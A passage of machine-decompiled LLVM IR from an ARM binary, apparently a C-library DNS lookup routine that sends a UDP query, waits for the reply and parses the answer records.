  store i32 %v0_15b50, i32* @ip, align 4
  store i32 %v1_15b98, i32* @r5, align 4
  %v0_15de8 = load i32, i32* @sl, align 4
  %v2_15de8 = add i32 %v0_15de8, %v6_15dcc
  store i32 %v2_15de8, i32* %r1.global-to-local, align 4
  %v1_15dec = sub i32 512, %v6_15dcc
  store i32 %v1_15dec, i32* %r2.global-to-local, align 4
  store i32 %v1_15b98, i32* %stack_var_-60, align 4
  %v4_15df8 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_15de8, i32 %v1_15dec)
  store i32 %v4_15df8, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15dfc = icmp slt i32 %v4_15df8, 0
  br i1 %v1_15dfc, label %dec_label_pc_162ac, label %dec_label_pc_15e04

dec_label_pc_15e04:                               ; preds = %dec_label_pc_15dd8
  %v3_15e08 = load i16, i16* %stack_var_-104, align 2
  %v4_15e08 = sext i16 %v3_15e08 to i32
  store i32 17, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_15e14 = call i32 @socket(i32 %v4_15e08, i32 2, i32 17)
  store i32 %v3_15e14, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15e18 = icmp slt i32 %v3_15e14, 0
  br i1 %v1_15e18, label %dec_label_pc_16284, label %dec_label_pc_15e24

dec_label_pc_15e24:                               ; preds = %dec_label_pc_15e04
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 %v2_15d60, i32* %r1.global-to-local, align 4
  %v3_15e2c = call i32 @__libc_connect(i32 %v3_15e14, i32 %v2_15d60, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15e30 = icmp slt i32 %v3_15e2c, 0
  br i1 %v1_15e30, label %dec_label_pc_16284, label %dec_label_pc_15e38

dec_label_pc_15e38:                               ; preds = %dec_label_pc_15e24
  %v0_15e38 = load i32, i32* @r5, align 4
  %v1_15e38 = load i32, i32* @r4, align 4
  %v2_15e38 = add i32 %v1_15e38, %v0_15e38
  store i32 %v2_15e38, i32* %r2.global-to-local, align 4
  %v0_15e3c = load i32, i32* @fp, align 4
  store i32 %v0_15e3c, i32* %r3.global-to-local, align 4
  %v0_15e44 = load i32, i32* @sl, align 4
  store i32 %v0_15e44, i32* %r1.global-to-local, align 4
  %v4_15e48 = call i32 @__libc_send(i32 %v3_15e14, i32 %v0_15e44, i32 %v2_15e38, i32 %v0_15e3c)
  store i32 818, i32* %r3.global-to-local, align 4
  %v0_15e50 = load i32, i32* @r8, align 4
  %v2_15e50 = add i32 %v0_15e50, 818
  %v3_15e50 = inttoptr i32 %v2_15e50 to i8*
  %v4_15e50 = load i8, i8* %v3_15e50, align 1
  %v6_15e50 = zext i8 %v4_15e50 to i32
  store i32 %v6_15e50, i32* %r2.global-to-local, align 4
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_15e58 = mul nuw nsw i32 %v6_15e50, 1000
  store i32 %v2_15e58, i32* @r4, align 4
  store i32 %v2_15e5c, i32* @r5, align 4
  br label %dec_label_pc_15e60

dec_label_pc_15e60:                               ; preds = %thread-pre-split, %dec_label_pc_15e38
  %v0_15e70 = phi i32 [ %v1_15eac, %thread-pre-split ], [ %v2_15e58, %dec_label_pc_15e38 ]
  store i32 %v3_15e14, i32* %stack_var_-48, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %v0_15e70, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v8_15e80 = call i32 @__GI_poll(i32 %v2_15e5c, i32 1, i32 %v0_15e70, i32 1, i32 %v3_15e14, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_15e88 = load i32, i32* @sl, align 4
  store i32 %v0_15e88, i32* %r1.global-to-local, align 4
  store i32 512, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp223 = icmp slt i32 %v8_15e80, 1
  br i1 %tmp223, label %dec_label_pc_16284, label %dec_label_pc_15e9c

dec_label_pc_15e9c:                               ; preds = %dec_label_pc_15e60
  %v4_15e9c = call i32 @__libc_recv(i32 %v3_15e14, i32 %v0_15e88, i32 512, i32 64)
  %v2_15ea0 = icmp ugt i32 %v4_15e9c, 10
  store i1 %v2_15ea0, i1* %cpsr_c.global-to-local, align 1
  %v8_15ea8 = icmp sgt i32 %v4_15e9c, 11
  br i1 %v8_15ea8, label %dec_label_pc_15ed4, label %dec_label_pc_15eac

dec_label_pc_15eac:                               ; preds = %dec_label_pc_15ed4, %dec_label_pc_15ef0, %dec_label_pc_15e9c
  %v0_15eac = load i32, i32* @r4, align 4
  %v1_15eac = add i32 %v0_15eac, -1000
  store i32 %v1_15eac, i32* @r4, align 4
  %v7_15eac = icmp eq i32 %v0_15eac, 1000
  %tmp286 = zext i1 %v7_15eac to i32
  %. = xor i32 %tmp286, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15ebc = icmp slt i32 %v4_15e9c, 0
  br i1 %v1_15ebc, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_15eac
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_16284

thread-pre-split:                                 ; preds = %dec_label_pc_15eac
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_15eac, label %dec_label_pc_16284, label %dec_label_pc_15e60

dec_label_pc_15ed4:                               ; preds = %dec_label_pc_15e9c
  %v0_15ed4 = load i32, i32* @sl, align 4
  store i32 %v2_15d88, i32* %r1.global-to-local, align 4
  %v2_15edc = inttoptr i32 %v0_15ed4 to i8*
  %v3_15edc = call i32 @__decode_header(i8* %v2_15edc, i32 %v2_15d88)
  %v3_15ee0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_15ee0, i32* %r3.global-to-local, align 4
  %v3_15ee8 = icmp uge i32 %v3_15ee0, %v3_15d40
  store i1 %v3_15ee8, i1* %cpsr_c.global-to-local, align 1
  %v9_15ee8 = icmp eq i32 %v3_15ee0, %v3_15d40
  br i1 %v9_15ee8, label %dec_label_pc_15ef0, label %dec_label_pc_15eac

dec_label_pc_15ef0:                               ; preds = %dec_label_pc_15ed4
  store i32 %tmp165, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_15ef4, label %dec_label_pc_15eac, label %dec_label_pc_15efc

dec_label_pc_15efc:                               ; preds = %dec_label_pc_15ef0
  store i32 %tmp164, i32* %r2.global-to-local, align 4
  store i32 %v1_15f00, i32* %r3.global-to-local, align 4
  store i1 %v2_15f04, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_15f00.cmp, label %dec_label_pc_15f40, label %dec_label_pc_15f0c

dec_label_pc_15f0c:                               ; preds = %dec_label_pc_15efc
  store i32 %v4_15bc8, i32* @r1, align 4
  store i1 %v2_15f10, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_15f10, label %dec_label_pc_15f2c, label %dec_label_pc_15f18

dec_label_pc_15f18:                               ; preds = %dec_label_pc_15f0c
  store i32 %v4_15c8c, i32* %r2.global-to-local, align 4
  %v1_15f1c = add i32 %v4_15c8c, -1
  store i32 %v1_15f1c, i32* %r3.global-to-local, align 4
  %v0_15f20 = load i32, i32* @r7, align 4
  %v3_15f20 = icmp uge i32 %v0_15f20, %v1_15f1c
  store i1 %v3_15f20, i1* %cpsr_c.global-to-local, align 1
  %v5_15f24 = icmp slt i32 %v0_15f20, %v1_15f1c
  br i1 %v5_15f24, label %.thread8, label %dec_label_pc_15f2c

.thread8:                                         ; preds = %dec_label_pc_15f18
  %v7_15f24 = add i32 %v0_15f20, 1
  br label %dec_label_pc_16294

dec_label_pc_15f2c:                               ; preds = %dec_label_pc_15f18, %dec_label_pc_15f0c
  store i32 53732, i32* %r3.global-to-local, align 4
  %v0_15f30 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_15f70

dec_label_pc_15f40:                               ; preds = %dec_label_pc_15efc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_15f40, label %dec_label_pc_15f48, label %dec_label_pc_16284

dec_label_pc_15f48:                               ; preds = %dec_label_pc_15f40
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp218, label %dec_label_pc_15f60, label %dec_label_pc_15f78

dec_label_pc_15f60:                               ; preds = %dec_label_pc_15f48
  store i32 53680, i32* %r3.global-to-local, align 4
  %v0_15f64 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_15f70

dec_label_pc_15f70:                               ; preds = %dec_label_pc_15f2c, %dec_label_pc_15f60
  %storemerge3 = phi i32 [ %v0_15f30, %dec_label_pc_15f2c ], [ %v0_15f64, %dec_label_pc_15f60 ]
  %storemerge = phi i32 [ 1, %dec_label_pc_15f2c ], [ 4, %dec_label_pc_15f60 ]
  %storemerge2 = load i32, i32* @global_var_23120.283, align 4
  store i32 %storemerge2, i32* %r3.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v3_15f70 = add i32 %storemerge2, %storemerge3
  %v4_15f70 = inttoptr i32 %v3_15f70 to i32*
  store i32 %storemerge, i32* %v4_15f70, align 4
  br label %dec_label_pc_162d4

dec_label_pc_15f78:                               ; preds = %dec_label_pc_15f48
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_15f7c.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @r7, align 4
  %v2_15f7c = add i32 %v0_15f7c.pre, 12
  store i32 %v2_15f7c, i32* @r4, align 4
  %v3_15f7c = icmp ugt i32 %v0_15f7c.pre, -13
  store i1 %v3_15f7c, i1* %cpsr_c.global-to-local, align 1
  %v9_15f7c = icmp eq i32 %v2_15f7c, 0
  br i1 %v9_15f7c, label %dec_label_pc_16284, label %dec_label_pc_15f84

dec_label_pc_15f84:                               ; preds = %dec_label_pc_15f78
  %v2_15f8c = add i32 %v4_15e9c, -12
  store i32 %v2_15f8c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp227 = icmp slt i32 %v2_15f8c, 1
  br i1 %tmp227, label %dec_label_pc_16284, label %dec_label_pc_15f98

dec_label_pc_15f90thread-pre-split:               ; preds = %dec_label_pc_15fb4
  %v2_15fc016 = add i32 %v2_15fa4, -1
  store i32 %v2_15fc016, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp228 = icmp slt i32 %v2_15fc016, 1
  br i1 %tmp228, label %dec_label_pc_16284, label %dec_label_pc_15f98

dec_label_pc_15f98:                               ; preds = %dec_label_pc_15f84, %dec_label_pc_15f90thread-pre-split
  %v1_15fbc = phi i32 [ %v2_15fc016, %dec_label_pc_15f90thread-pre-split ], [ %v2_15f8c, %dec_label_pc_15f84 ]
  %v0_15f98 = phi i32 [ %v2_15fac, %dec_label_pc_15f90thread-pre-split ], [ %v2_15f7c, %dec_label_pc_15f84 ]
  %v1_15f98 = inttoptr i32 %v0_15f98 to i8*
  %v2_15f98 = load i8, i8* %v1_15f98, align 1
  %v3_15f98 = zext i8 %v2_15f98 to i32
  store i32 %v3_15f98, i32* %r3.global-to-local, align 4
  %v5_15f98 = add i32 %v0_15f98, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15f9c = icmp eq i8 %v2_15f98, 0
  store i32 %v5_15f98, i32* %r2.global-to-local, align 4
  %v2_15fa4 = sub i32 %v1_15fbc, %v3_15f98
  store i32 %v2_15fa4, i32* @lr, align 4
  %v2_15fac = add i32 %v3_15f98, %v5_15f98
  br i1 %v2_15f9c, label %dec_label_pc_15fc8, label %dec_label_pc_15fb4

dec_label_pc_15fb4:                               ; preds = %dec_label_pc_15f98
  %v1_15fa8 = and i32 %v3_15f98, 192
  %v2_15fb4 = icmp eq i32 %v1_15fa8, 192
  store i1 %v2_15fb4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_15fb4, label %.thread10, label %dec_label_pc_15f90thread-pre-split

.thread10:                                        ; preds = %dec_label_pc_15fb4
  %v2_15fb8 = add i32 %v0_15f98, 2
  store i32 %v2_15fb8, i32* %r2.global-to-local, align 4
  %v2_15fbc = add i32 %v1_15fbc, -2
  store i32 %v2_15fbc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_15fc8

dec_label_pc_15fc8:                               ; preds = %dec_label_pc_15f98, %.thread10
  %v1_15fd4 = phi i32 [ %v2_15fb8, %.thread10 ], [ %v5_15f98, %dec_label_pc_15f98 ]
  %v0_15fc8 = phi i32 [ %v2_15fbc, %.thread10 ], [ %v1_15fbc, %dec_label_pc_15f98 ]
  %v1_15fc8 = add i32 %v0_15fc8, -3
  %v2_15fc8 = icmp ugt i32 %v0_15fc8, 2
  store i1 %v2_15fc8, i1* %cpsr_c.global-to-local, align 1
  %v3_15fc8 = sub i32 2, %v0_15fc8
  %v4_15fc8 = and i32 %v3_15fc8, %v0_15fc8
  %v5_15fc8 = icmp slt i32 %v4_15fc8, 0
  %v6_15fc8 = icmp slt i32 %v1_15fc8, 0
  %v7_15fc8 = icmp eq i32 %v0_15fc8, 3
  %v3_15fcc = xor i1 %v6_15fc8, %v5_15fc8
  %v4_15fcc = or i1 %v7_15fc8, %v3_15fcc
  br i1 %v4_15fcc, label %dec_label_pc_16284, label %dec_label_pc_15fd0

dec_label_pc_15fd0:                               ; preds = %dec_label_pc_15fc8
  %v1_15fd0 = sub i32 -8, %v0_15f7c.pre
  %v2_15fd4 = add i32 %v1_15fd4, %v1_15fd0
  store i32 %v2_15fd4, i32* %r3.global-to-local, align 4
  %v3_15fd4 = icmp ult i32 %v2_15fd4, %v1_15fd0
  store i1 %v3_15fd4, i1* %cpsr_c.global-to-local, align 1
  %v8_15fd4 = icmp slt i32 %v2_15fd4, 0
  br i1 %v8_15fd4, label %dec_label_pc_16284, label %dec_label_pc_15ff8

dec_label_pc_15ff8:                               ; preds = %dec_label_pc_15fd0
  %v2_15fe0 = add i32 %v2_15fd4, 12
  store i32 1, i32* @r1, align 4
  store i32 %v2_16004, i32* @r5, align 4
  %v1_16018 = load i32, i32* @sb, align 4
  %v2_16018 = inttoptr i32 %v1_16018 to i32*
  store i32 0, i32* %v2_16018, align 4
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_1625857, label %dec_label_pc_16020, label %dec_label_pc_1625c

dec_label_pc_16020:                               ; preds = %dec_label_pc_15ff8, %dec_label_pc_16234
  %stack_var_-460.365 = phi i32 [ %v2_1623c, %dec_label_pc_16234 ], [ %v2_15fe0, %dec_label_pc_15ff8 ]
  %stack_var_-452.062 = phi i32 [ %v1_16240, %dec_label_pc_16234 ], [ 0, %dec_label_pc_15ff8 ]
  %stack_var_-480.261 = phi i32 [ %stack_var_-480.1, %dec_label_pc_16234 ], [ 1, %dec_label_pc_15ff8 ]
  %v0_16020 = load i32, i32* @sl, align 4
  store i32 %stack_var_-460.365, i32* @r1, align 4
  store i32 %v4_15e9c, i32* %r2.global-to-local, align 4
  store i32 %v2_16000, i32* %r3.global-to-local, align 4
  store i32 256, i32* @r7, align 4
  %v5_16038 = call i32 @__decode_dotted(i32 %v0_16020, i32 %stack_var_-460.365, i32 %v4_15e9c, i32 %v2_16000, i32 256)
  store i32 %v5_16038, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1603c = icmp slt i32 %v5_16038, 0
  br i1 %v1_1603c, label %dec_label_pc_1610c, label %dec_label_pc_16044

dec_label_pc_16044:                               ; preds = %dec_label_pc_16020
  %v1_1604c = add i32 %v5_16038, 10
  store i32 %v1_1604c, i32* @fp, align 4
  %v2_16050 = sub i32 %v4_15e9c, %stack_var_-460.365
  %v2_16054 = sub i32 %v2_16050, %v1_1604c
  store i32 %v2_16054, i32* %r3.global-to-local, align 4
  %v3_16054 = icmp uge i32 %v2_16050, %v1_1604c
  store i1 %v3_16054, i1* %cpsr_c.global-to-local, align 1
  %v8_16054 = icmp slt i32 %v2_16054, 0
  br i1 %v8_16054, label %dec_label_pc_16104.thread, label %dec_label_pc_16064

dec_label_pc_16104.thread:                        ; preds = %dec_label_pc_16044
  store i32 %v2_16054, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_1610c

dec_label_pc_16064:                               ; preds = %dec_label_pc_16044
  %v2_16068 = call i32 @__GI_strdup(i8* %v1_16068)
  %v0_16070 = load i32, i32* @r4, align 4
  %v2_16070 = add i32 %v0_16070, %stack_var_-460.365
  %v0_16074 = load i32, i32* @sl, align 4
  %v2_16074 = add i32 %v0_16074, %v2_16070
  store i32 %v2_16074, i32* %r1.global-to-local, align 4
  %v1_16078 = add i32 %v2_16074, 2
  %v1_1607c = add i32 %v2_16074, 4
  store i32 %v1_1607c, i32* %r3.global-to-local, align 4
  %v1_16080 = add i32 %v2_16074, 5
  %v2_16080 = inttoptr i32 %v1_16080 to i8*
  %v3_16080 = load i8, i8* %v2_16080, align 1
  %v4_16080 = zext i8 %v3_16080 to i32
  %v2_16084 = inttoptr i32 %v1_1607c to i8*
  %v3_16084 = load i8, i8* %v2_16084, align 1
  %v4_16084 = zext i8 %v3_16084 to i32
  %v1_16088 = add i32 %v2_16074, 8
  %v2_16088 = inttoptr i32 %v1_16088 to i8*
  %v3_16088 = load i8, i8* %v2_16088, align 1
  %v4_16088 = zext i8 %v3_16088 to i32
  %v1_1608c = add i32 %v2_16074, 7
  %v2_1608c = inttoptr i32 %v1_1608c to i8*
  %v3_1608c = load i8, i8* %v2_1608c, align 1
  %v4_1608c = zext i8 %v3_1608c to i32
  store i32 %v4_1608c, i32* %r2.global-to-local, align 4
  %v1_16094 = add i32 %v2_16074, 6
  %v2_16094 = inttoptr i32 %v1_16094 to i8*
  %v3_16094 = load i8, i8* %v2_16094, align 1
  %v4_16094 = zext i8 %v3_16094 to i32
  store i32 %v4_16094, i32* %r3.global-to-local, align 4
  %v1_16098 = add i32 %v2_16074, 9
  %v2_16098 = inttoptr i32 %v1_16098 to i8*
  %v3_16098 = load i8, i8* %v2_16098, align 1
  %v4_16098 = zext i8 %v3_16098 to i32
  %v3_160a0 = inttoptr i32 %v2_16074 to i8*
  %v4_160a0 = load i8, i8* %v3_160a0, align 1
  %v6_160a0 = zext i8 %v4_160a0 to i32
  %v1_160a4 = add i32 %v2_16074, 3
  %v2_160a4 = inttoptr i32 %v1_160a4 to i8*
  %v3_160a4 = load i8, i8* %v2_160a4, align 1
  %v4_160a4 = zext i8 %v3_160a4 to i32
  store i32 %v4_160a4, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v4_160a8 = mul nuw i32 %v4_16084, 16777216
  %v5_160a8 = or i32 %v4_1608c, %v4_160a8
  store i32 %v5_160a8, i32* %r2.global-to-local, align 4
  %v2_160ac = inttoptr i32 %v1_16078 to i8*
  %v3_160ac = load i8, i8* %v2_160ac, align 1
  %v4_160ac = zext i8 %v3_160ac to i32
  %v1_160b0 = add i32 %v2_16074, 1
  %v2_160b0 = inttoptr i32 %v1_160b0 to i8*
  %v3_160b0 = load i8, i8* %v2_160b0, align 1
  %v4_160b0 = zext i8 %v3_160b0 to i32
  %v4_160b4 = mul nuw nsw i32 %v4_16088, 256
  %v5_160b4 = or i32 %v4_16098, %v4_160b4
  store i32 %v5_160b4, i32* @r6, align 4
  store i32 %v4_16080, i32* @r7, align 4
  %v4_160bc = mul nuw nsw i32 %v6_160a0, 256
  %v5_160bc = or i32 %v4_160b0, %v4_160bc
  store i32 %v5_160bc, i32* @lr, align 4
  %v4_160c0 = mul nuw nsw i32 %v4_160ac, 256
  %v5_160c0 = or i32 %v4_160c0, %v4_160a4
  store i32 %v5_160c0, i32* %r3.global-to-local, align 4
  store i32 %v2_16054, i32* @r5, align 4
  %v4_160cc = mul nuw nsw i32 %v4_16080, 65536
  %v5_160cc = or i32 %v5_160a8, %v4_160cc
  %v4_160d0 = mul nuw nsw i32 %v4_16094, 256
  %v5_160d0 = or i32 %v5_160cc, %v4_160d0
  store i32 %v5_160d0, i32* %r2.global-to-local, align 4
  %v1_160d4 = add i32 %v2_16074, 10
  store i32 %v1_160d4, i32* @r1, align 4
  %v1_160d8 = add i32 %v2_16070, 10
  store i32 %v1_160d8, i32* @r4, align 4
  %v2_160dc = sub i32 %v2_16054, %v5_160b4
  %v3_160dc = icmp uge i32 %v2_16054, %v5_160b4
  store i1 %v3_160dc, i1* %cpsr_c.global-to-local, align 1
  %tmp230 = sub i32 0, %v2_160dc
  %v6_160dc = and i32 %v2_16054, %tmp230
  %v7_160dc = icmp slt i32 %v6_160dc, 0
  %v8_160dc = icmp slt i32 %v2_160dc, 0
  store i32 %v2_16068, i32* %stack_var_-144, align 4
  %v2_160fc = xor i1 %v8_160dc, %v7_160dc
  br i1 %v2_160fc, label %dec_label_pc_1610c, label %dec_label_pc_16104

dec_label_pc_16104:                               ; preds = %dec_label_pc_16064
  %v0_16100 = load i32, i32* @fp, align 4
  %v2_16100 = add i32 %v0_16100, %v5_160b4
  store i32 %v2_16100, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_16104 = icmp slt i32 %v2_16100, 0
  br i1 %v1_16104, label %dec_label_pc_1610c, label %dec_label_pc_16128

dec_label_pc_1610c:                               ; preds = %dec_label_pc_16104, %dec_label_pc_16064, %dec_label_pc_16020, %dec_label_pc_16104.thread
  store i32 %stack_var_-452.062, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16110 = icmp eq i32 %stack_var_-452.062, 0
  br i1 %v2_16110, label %dec_label_pc_16284, label %dec_label_pc_16118

dec_label_pc_16118:                               ; preds = %dec_label_pc_1610c
  store i32 %tmp148, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_1611c, label %dec_label_pc_16284, label %dec_label_pc_1625c

dec_label_pc_16128:                               ; preds = %dec_label_pc_16104
  store i32 %stack_var_-480.261, i32* @ip, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1612c = icmp eq i32 %stack_var_-480.261, 0
  br i1 %v2_1612c, label %dec_label_pc_161dc, label %dec_label_pc_16134

dec_label_pc_16134:                               ; preds = %dec_label_pc_16128
  %v0_16134 = load i32, i32* @sb, align 4
  %v1_16134 = add i32 %v0_16134, 28
  %v2_16134 = inttoptr i32 %v1_16134 to i32*
  %v3_16134 = load i32, i32* %v2_16134, align 4
  store i32 %v3_16134, i32* @r3, align 4
  %v1_16138 = add i32 %v0_16134, 32
  %v2_16138 = inttoptr i32 %v1_16138 to i32*
  %v3_16138 = load i32, i32* %v2_16138, align 4
  store i32 %v3_16138, i32* %r2.global-to-local, align 4
  %v1_1613c = add i32 %v0_16134, 36
  %v2_1613c = inttoptr i32 %v1_1613c to i32*
  %v3_1613c = load i32, i32* %v2_1613c, align 4
  store i32 %v3_1613c, i32* %r1.global-to-local, align 4
  %v1_16140 = inttoptr i32 %v0_16134 to i32*
  %v2_16140 = load i32, i32* %v1_16140, align 4
  store i32 %v2_16140, i32* @r0, align 4
  %v0_16150 = call i32 @free()
  store i32 40, i32* @r2, align 4
  %v0_16158 = load i32, i32* @sb, align 4
  store i32 %v0_16158, i32* @r0, align 4
  store i32 %v2_16004, i32* @r1, align 4
  %v0_16160 = call i32 @memcpy()
  %v0_16164 = load i32, i32* @sb, align 4
  %v1_16164 = add i32 %v0_16164, 4
  %v2_16164 = inttoptr i32 %v1_16164 to i32*
  %v3_16164 = load i32, i32* %v2_16164, align 4
  store i32 %v3_16164, i32* %r2.global-to-local, align 4
  %v2_16168 = icmp ugt i32 %v3_16164, 23
  store i1 %v2_16168, i1* %cpsr_c.global-to-local, align 1
  %v7_16168 = icmp eq i32 %v3_16164, 24
  br i1 %v7_16168, label %dec_label_pc_1618c, label %dec_label_pc_16170

dec_label_pc_16170:                               ; preds = %dec_label_pc_16134
  %v1_16170 = add i32 %v0_16164, 28
  %v2_16170 = inttoptr i32 %v1_16170 to i32*
  %v3_16170 = load i32, i32* %v2_16170, align 4
  store i32 %v3_16170, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16174 = icmp eq i32 %v3_16170, 0
  br i1 %v2_16174, label %dec_label_pc_1625c, label %dec_label_pc_1617c

dec_label_pc_1617c:                               ; preds = %dec_label_pc_16170
  store i1 %v2_16180, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_16180, label %dec_label_pc_1618c, label %bb231

bb231:                                            ; preds = %dec_label_pc_1617c
  store i1 %v3_16184, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_16184, label %dec_label_pc_1618c, label %dec_label_pc_1625c

dec_label_pc_1618c:                               ; preds = %dec_label_pc_1617c, %bb231, %dec_label_pc_16134
  store i32 %v0_15b50, i32* %r1.global-to-local, align 4
  %v3_16190 = icmp uge i32 %v3_16164, %v0_15b50
  store i1 %v3_16190, i1* %cpsr_c.global-to-local, align 1
  %v9_16190 = icmp eq i32 %v3_16164, %v0_15b50
  br i1 %v9_16190, label %dec_label_pc_161a0, label %bb232

bb232:                                            ; preds = %dec_label_pc_1618c
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16234

dec_label_pc_161a0:                               ; preds = %dec_label_pc_1618c
  store i32 %tmp163, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.062, i32* @r5, align 4
  %v1_161a8 = add i32 %v0_16164, 16
  %v2_161a8 = inttoptr i32 %v1_161a8 to i32*
  %v3_161a8 = load i32, i32* %v2_161a8, align 4
  %v2_161ac = sub i32 %tmp163, %stack_var_-452.062
  %v1_161b0 = add i32 %v2_161ac, -1
  store i32 %v1_161b0, i32* %r3.global-to-local, align 4
  %v1_161b4 = add i32 %v3_161a8, 4
  store i32 %v1_161b4, i32* %r2.global-to-local, align 4
  %v2_161b8 = mul i32 %v1_161b4, %v1_161b0
  store i32 %v2_161b8, i32* @r1, align 4
  %v1_161bc = add i32 %v0_16164, 32
  %v2_161bc = inttoptr i32 %v1_161bc to i32*
  %v3_161bc = load i32, i32* %v2_161bc, align 4
  store i32 %v3_161bc, i32* %r2.global-to-local, align 4
  %v3_161c0 = icmp uge i32 %v2_161b8, %v3_161bc
  store i1 %v3_161c0, i1* %cpsr_c.global-to-local, align 1
  %v2_161c4 = add i32 %v0_16164, 36
  %v3_161c4 = inttoptr i32 %v2_161c4 to i32*
  store i32 %v1_161b0, i32* %v3_161c4, align 4
  %tmp289 = icmp ugt i32 %v2_161b8, %v3_161bc
  br i1 %tmp289, label %dec_label_pc_1625c, label %dec_label_pc_161cc

dec_label_pc_161cc:                               ; preds = %dec_label_pc_161a0
  store i32 0, i32* @r7, align 4
  %v1_161d4 = load i32, i32* @sb, align 4
  %v2_161d4 = add i32 %v1_161d4, 36
  %v3_161d4 = inttoptr i32 %v2_161d4 to i32*
  store i32 0, i32* %v3_161d4, align 4
  br label %dec_label_pc_16234

dec_label_pc_161dc:                               ; preds = %dec_label_pc_16128
  store i32 %v2_16068, i32* @r0, align 4
  %v0_161e0 = call i32 @free()
  store i32 %v5_160bc, i32* %r3.global-to-local, align 4
  store i32 %v0_15b50, i32* @ip, align 4
  %v3_161ec = icmp uge i32 %v5_160bc, %v0_15b50
  store i1 %v3_161ec, i1* %cpsr_c.global-to-local, align 1
  %v9_161ec = icmp eq i32 %v5_160bc, %v0_15b50
  br i1 %v9_161ec, label %dec_label_pc_161f4, label %dec_label_pc_16234

dec_label_pc_161f4:                               ; preds = %dec_label_pc_161dc
  %v0_161f4 = load i32, i32* @sb, align 4
  %v1_161f4 = add i32 %v0_161f4, 16
  %v2_161f4 = inttoptr i32 %v1_161f4 to i32*
  %v3_161f4 = load i32, i32* %v2_161f4, align 4
  store i32 %v3_161f4, i32* %r1.global-to-local, align 4
  store i32 %v5_160b4, i32* %r3.global-to-local, align 4
  %v3_161fc = icmp uge i32 %v3_161f4, %v5_160b4
  store i1 %v3_161fc, i1* %cpsr_c.global-to-local, align 1
  %v9_161fc = icmp eq i32 %v3_161f4, %v5_160b4
  br i1 %v9_161fc, label %dec_label_pc_16210, label %dec_label_pc_16204

dec_label_pc_16204:                               ; preds = %dec_label_pc_161f4
  %v1_16204 = inttoptr i32 %v0_161f4 to i32*
  %v2_16204 = load i32, i32* %v1_16204, align 4
  store i32 %v2_16204, i32* @r0, align 4
  %v0_16208 = call i32 @free()
  br label %dec_label_pc_16284

dec_label_pc_16210:                               ; preds = %dec_label_pc_161f4
  %v1_16210 = add i32 %v0_161f4, 36
  %v2_16210 = inttoptr i32 %v1_16210 to i32*
  %v3_16210 = load i32, i32* %v2_16210, align 4
  store i32 %v3_16210, i32* %r2.global-to-local, align 4
  %v1_16214 = add i32 %v0_161f4, 28
  %v2_16214 = inttoptr i32 %v1_16214 to i32*
  %v3_16214 = load i32, i32* %v2_16214, align 4
  store i32 %v3_16214, i32* @r3, align 4
  %v3_16218 = mul i32 %v3_16210, %v5_160b4
  %v4_16218 = add i32 %v3_16214, %v3_16218
  store i32 %v4_16218, i32* @r0, align 4
  store i32 %v5_160b4, i32* @r2, align 4
  store i32 %v1_160d4, i32* @r1, align 4
  %v0_16224 = call i32 @memcpy()
  %v0_16228 = load i32, i32* @sb, align 4
  %v1_16228 = add i32 %v0_16228, 36
